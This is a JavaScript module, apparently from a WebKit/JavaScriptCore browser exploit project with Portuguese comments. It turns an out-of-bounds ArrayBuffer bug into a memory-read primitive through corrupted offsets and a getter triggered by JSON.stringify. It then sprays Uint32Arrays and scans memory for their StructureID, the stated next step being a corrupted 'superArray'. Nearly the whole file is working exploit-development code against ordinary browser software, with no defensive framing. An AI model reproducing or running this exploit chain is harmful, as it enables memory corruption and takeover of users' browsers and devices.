// js/script3/testRetypeOOB_AB_ViaShadowCraft.mjs
import { logS3, PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex, isAdvancedInt64Object } from '../utils.mjs';
import {
    triggerOOB_primitive,
    oob_array_buffer_real,
    oob_dataview_real,
    oob_write_absolute,
    oob_read_absolute,
    clearOOBEnvironment
} from '../core_exploit.mjs';
import { OOB_CONFIG, JSC_OFFSETS, WEBKIT_LIBRARY_INFO } from '../config.mjs';

// ============================================================
// DEFINIÇÕES DE CONSTANTES E VARIÁVEIS GLOBAIS
// ============================================================
const FNAME_MAIN = "ExploitLogic_v10.29";

const GETTER_PROPERTY_NAME_COPY = "AAAA_GetterForMemoryCopy_v10_29";
const PLANT_OFFSET_0x6C_FOR_COPY_SRC_DWORD = 0x6C;
const INTERMEDIATE_PTR_OFFSET_0x68 = 0x68;
const CORRUPTION_OFFSET_TRIGGER = 0x70;
const CORRUPTION_VALUE_TRIGGER = new AdvancedInt64(0xFFFFFFFF, 0xFFFFFFFF);
const TARGET_COPY_DEST_OFFSET_IN_OOB = 0x180; // Onde o QWORD lido (JSCell) será copiado

let getter_copy_called_flag_v10_29 = false;

// !!!!! ESTE VALOR SERÁ O ALVO DA DESCOBERTA DESTE SCRIPT !!!!!
let EXPECTED_UINT32ARRAY_STRUCTURE_ID = null; 
const PLACEHOLDER_SID_UINT32ARRAY = 0xBADBAD00 | 47; // Novo placeholder

// ============================================================
// PRIMITIVA DE CÓPIA DE MEMÓRIA (VALIDADA)
// ============================================================
async function readFromOOBOffsetViaCopy(dword_source_offset_to_read_from) {
    const FNAME_PRIMITIVE = `${FNAME_MAIN}.readFromOOBOffsetViaCopy`;
    getter_copy_called_flag_v10_29 = false;

    if (!oob_array_buffer_real || !oob_dataview_real) {
        await triggerOOB_primitive();
        if (!oob_array_buffer_real) return new AdvancedInt64(0xDEADDEAD, 0xBADBAD);
    }
    // Limpar o destino da cópia para garantir que não estamos lendo lixo antigo
    oob_write_absolute(TARGET_COPY_DEST_OFFSET_IN_OOB, AdvancedInt64.Zero, 8);

    // Plantar o dword_source_offset_to_read_from como a parte baixa do QWORD em PLANT_OFFSET_0x6C.
    // A parte alta (segundo argumento para AdvancedInt64) não importa para a formação do valor em 0x68.high.
    const value_to_plant_at_0x6c = new AdvancedInt64(dword_source_offset_to_read_from, 0);
    oob_write_absolute(PLANT_OFFSET_0x6C_FOR_COPY_SRC_DWORD, value_to_plant_at_0x6c, 8);

    const getterObjectForCopy = {
        get [GETTER_PROPERTY_NAME_COPY]() {
            getter_copy_called_flag_v10_29 = true;
            try {
                const qword_at_0x68 = oob_read_absolute(INTERMEDIATE_PTR_OFFSET_0x68, 8);
                const effective_read_offset = qword_at_0x68.high(); // Este DEVE ser dword_source_offset_to_read_from

                if (effective_read_offset === dword_source_offset_to_read_from) {
                    if (effective_read_offset >= 0 && effective_read_offset < oob_array_buffer_real.byteLength - 8) {
                        const data_read = oob_read_absolute(effective_read_offset, 8);
                        oob_write_absolute(TARGET_COPY_DEST_OFFSET_IN_OOB, data_read, 8);
                    } else {
                        // logS3(`  [GETTER ${GETTER_PROPERTY_NAME_COPY}] Offset de leitura efetivo ${toHex(effective_read_offset)} fora dos limites.`, "warn", FNAME_PRIMITIVE);
                        oob_write_absolute(TARGET_COPY_DEST_OFFSET_IN_OOB, new AdvancedInt64(0x0B000B00,0x0B000B00), 8); // OOB Read Error
                    }
                } else {
                    // logS3(`  [GETTER ${GETTER_PROPERTY_NAME_COPY}] ERRO MÁGICA: effective_read_offset (${toHex(effective_read_offset)}) != dword_source_offset (${toHex(dword_source_offset_to_read_from)})! Qword@0x68 era ${qword_at_0x68.toString(true)}`, "critical", FNAME_PRIMITIVE);
                    oob_write_absolute(TARGET_COPY_DEST_OFFSET_IN_OOB, new AdvancedInt64(0xBAD68BAD, 0xBAD68BAD), 8); // Magic Error
                }
            } catch (e_getter) {
                // logS3(`  [GETTER ${GETTER_PROPERTY_NAME_COPY}] Erro interno: ${e_getter.message}`, "error", FNAME_PRIMITIVE);
                try {oob_write_absolute(TARGET_COPY_DEST_OFFSET_IN_OOB, new AdvancedInt64(0xDEADDEAD,0xBADBAD), 8); } catch(e){} // Getter Error
            }
            return "getter_copy_v10_29_done";
        }
    };

    oob_write_absolute(CORRUPTION_OFFSET_TRIGGER, CORRUPTION_VALUE_TRIGGER, 8);
    await PAUSE_S3(5); // Pausa mínima, a "mágica" deve ser rápida

    try { JSON.stringify(getterObjectForCopy); } catch (e) { /* Ignora */ }

    if (!getter_copy_called_flag_v10_29) { 
        // logS3(`ALERTA: Getter (${GETTER_PROPERTY_NAME_COPY}) NÃO foi chamado!`, "error", FNAME_PRIMITIVE);
        return null; 
    }
    return oob_read_absolute(TARGET_COPY_DEST_OFFSET_IN_OOB, 8);
}

// ============================================================
// FUNÇÃO PARA LER StructureID USANDO A PRIMITIVA DE CÓPIA
// ============================================================
async function getStructureIDFromOOB(offset_of_jscell_in_oob) {
    if (!oob_array_buffer_real || offset_of_jscell_in_oob < 0 || offset_of_jscell_in_oob >= oob_array_buffer_real.byteLength - 8) {
        return null;
    }
    const copied_qword = await readFromOOBOffsetViaCopy(offset_of_jscell_in_oob);
    
    // Verificar se a cópia retornou um valor de erro da primitiva
    if (copied_qword === null || 
        (isAdvancedInt64Object(copied_qword) && copied_qword.low() === 0xBADBAD && copied_qword.high() === 0xDEADDEAD) ||
        (isAdvancedInt64Object(copied_qword) && copied_qword.low() === 0xBAD68BAD && copied_qword.high() === 0xBAD68BAD) ||
        (isAdvancedInt64Object(copied_qword) && copied_qword.low() === 0x0B000B00 && copied_qword.high() === 0x0B000B00) ) {
        return null; // Indica falha na leitura ou erro da primitiva
    }
    
    if (isAdvancedInt64Object(copied_qword)) {
        return copied_qword.low(); // StructureID + Flags nos 4 bytes baixos do JSCell
    }
    return null;
}

// ============================================================
// FUNÇÃO PRINCIPAL DE INVESTIGAÇÃO (v10.29)
// ============================================================
export async function sprayAndInvestigateObjectExposure() {
    const FNAME_CURRENT_TEST = `${FNAME_MAIN}.discoverSID_v10.29`;
    logS3(`--- Iniciando ${FNAME_CURRENT_TEST}: Descoberta de StructureID de Uint32Array (Scan Intensivo Refinado) ---`, "test", FNAME_CURRENT_TEST);

    let sprayedU32Arrays = [];

    try {
        await triggerOOB_primitive();
        if (!oob_array_buffer_real) { throw new Error("OOB Init falhou."); }
        logS3("Ambiente OOB inicializado.", "info", FNAME_CURRENT_TEST);
        logS3(`   OBJETIVO: Encontrar o StructureID de Uint32Array. Placeholder atual: ${toHex(PLACEHOLDER_SID_UINT32ARRAY)}`, "info", FNAME_CURRENT_TEST);

        // --- PASSO 1: Pulverizar Uint32Arrays بكثافة ---
        logS3("PASSO 1: Pulverizando Uint32Arrays para descoberta de SID...", "info", FNAME_CURRENT_TEST);
        const NUM_U32_SPRAY = 400; // Aumentar ainda mais
        const U32_SPRAY_LEN_BASE = 1; // Objetos ainda menores (1 elemento = 4 bytes de dados + header)
        sprayedU32Arrays = [];
        for (let i = 0; i < NUM_U32_SPRAY; i++) {
            sprayedU32Arrays.push(new Uint32Array(U32_SPRAY_LEN_BASE + (i % 4))); // Tamanhos de 1 a 4 elementos
        }
        logS3(`  ${sprayedU32Arrays.length} Uint32Arrays pulverizados.`, "info", FNAME_CURRENT_TEST);
        await PAUSE_S3(1000); // Dar mais tempo para a heap assentar

        let found_sids_map = {};
        const SCAN_START = 0x040; 
        const SCAN_END = Math.min(0x7F00, oob_array_buffer_real.byteLength - 0x20); // Scan até ~31.75KB
        const SCAN_STEP_SID = 0x04; 

        logS3(`  Escaneando de ${toHex(SCAN_START)} a ${toHex(SCAN_END)} com passo ${toHex(SCAN_STEP_SID)} por SIDs... (PODE SER EXTREMAMENTE LENTO!)`, "warn", FNAME_CURRENT_TEST);
        let sids_found_in_scan = 0;
        const known_ab_sid = JSC_OFFSETS.ArrayBuffer.KnownStructureIDs.ArrayBuffer_STRUCTURE_ID;

        for (let offset = SCAN_START; offset < SCAN_END; offset += SCAN_STEP_SID) {
            let sid = await getStructureIDFromOOB(offset); // Usa a primitiva atualizada
            if (sid !== null && sid !== 0 && sid !== 0xFFFFFFFF) {
                if (typeof known_ab_sid === 'number' && (sid & 0xFFFFFFF0) === (known_ab_sid & 0xFFFFFFF0)) { // Ignora AB SID (considerando poucas flags)
                    continue; 
                }
                // Filtros para padrões de preenchimento comuns
                if (sid === 0xCAFEBABE || sid === 0xBADBAD00 || sid === 0xFEFEFEFE || sid === 0xDEADBEEF) {
                    continue;
                }
                
                found_sids_map[sid] = (found_sids_map[sid] || 0) + 1;
                sids_found_in_scan++;

                if (found_sids_map[sid] <= 5 || found_sids_map[sid] % 50 === 0) { // Loga as primeiras 5 e depois a cada 50
                     logS3(`    Offset ${toHex(offset)}: SID Potencial = ${toHex(sid)} (Contagem: ${found_sids_map[sid]})`, "leak", FNAME_CURRENT_TEST);
                }
            }
            // Log de progresso menos frequente para scan denso
            if (offset > SCAN_START && offset % (SCAN_STEP_SID * 2048) === 0) { // A cada ~8KB
                logS3(`    Scan em ${toHex(offset)}... SIDs únicos até agora: ${Object.keys(found_sids_map).length}`, "info", FNAME_CURRENT_TEST);
                await PAUSE_S3(5); 
            }
        }
        logS3(`  Scan concluído. Total de ${sids_found_in_scan} SIDs potenciais (filtrados) encontrados.`, "info", FNAME_CURRENT_TEST);

        let sorted_sids = Object.keys(found_sids_map).map(k => parseInt(k)).sort((a,b) => found_sids_map[b] - found_sids_map[a]);

        logS3("  Frequência dos SIDs encontrados (top 15 mais frequentes, filtrados por heurística):", "info", FNAME_CURRENT_TEST);
        let displayed_sids_count = 0;
        let most_frequent_sid_val = null; 
        let max_freq = 0;

        for(let i=0; i < sorted_sids.length && displayed_sids_count < 15; i++) {
            const sid_val = sorted_sids[i];
            const current_freq = found_sids_map[sid_val];
            // Heurística para SIDs de objetos JS (geralmente não são valores pequenos como 0x1, 0x2, etc., ou muito repetitivos como um padrão)
            if (current_freq > 2 && sid_val > 0x10000 && sid_val < 0x7FFFFFFF) { 
                logS3(`    - SID: ${toHex(sid_val)}  Contagem: ${current_freq}`, "info", FNAME_CURRENT_TEST);
                displayed_sids_count++;
                if (current_freq > max_freq) {
                    max_freq = current_freq;
                    most_frequent_sid_val = sid_val;
                }
            }
        }
        
        // Condição para aceitar o SID: deve ser o mais frequente E ter uma contagem mínima.
        if (most_frequent_sid_val !== null && max_freq > Math.min(NUM_U32_SPRAY / 50, 10)) { // Pelo menos 1/50 do spray, ou 10
            EXPECTED_UINT32ARRAY_STRUCTURE_ID = most_frequent_sid_val;
            logS3(`  !!!! StructureID MAIS PROMISSOR (candidato para Uint32Array): ${toHex(EXPECTED_UINT32ARRAY_STRUCTURE_ID)} (contagem: ${max_freq}) !!!!`, "vuln", FNAME_CURRENT_TEST);
            logS3("    >>>> COPIE ESTE VALOR PARA A CONSTANTE EXPECTED_UINT32ARRAY_STRUCTURE_ID NO TOPO DO ARQUIVO! <<<<", "critical", FNAME_CURRENT_TEST);
            document.title = `U32 SID? ${toHex(EXPECTED_UINT32ARRAY_STRUCTURE_ID)}`;
        } else {
            logS3("  Nenhum candidato a StructureID de Uint32Array suficientemente proeminente/confiável encontrado.", "warn", FNAME_CURRENT_TEST);
            EXPECTED_UINT32ARRAY_STRUCTURE_ID = PLACEHOLDER_SID_UINT32ARRAY;
        }
        logS3(`EXPECTED_UINT32ARRAY_STRUCTURE_ID (final para este run): ${toHex(EXPECTED_UINT32ARRAY_STRUCTURE_ID)}`, "info", FNAME_CURRENT_TEST);

        if (EXPECTED_UINT32ARRAY_STRUCTURE_ID !== PLACEHOLDER_SID_UINT32ARRAY) {
            logS3(`  Próximo passo: Usar SID ${toHex(EXPECTED_UINT32ARRAY_STRUCTURE_ID)} para corromper um Uint32Array real e tentar criar o 'superArray'.`, "info", FNAME_CURRENT_TEST);
        }

    } catch (e) {
        logS3(`ERRO CRÍTICO em ${FNAME_CURRENT_TEST}: ${e.message}`, "critical", FNAME_CURRENT_TEST);
        if (e.stack) logS3(`Stack: ${e.stack}`, "critical", FNAME_CURRENT_TEST);
        document.title = `${FNAME_MAIN} FALHOU!`;
    } finally {
        sprayedU32Arrays = [];
        clearOOBEnvironment();
        logS3(`--- ${FNAME_CURRENT_TEST} Concluído ---`, "test", FNAME_CURRENT_TEST);
    }
}
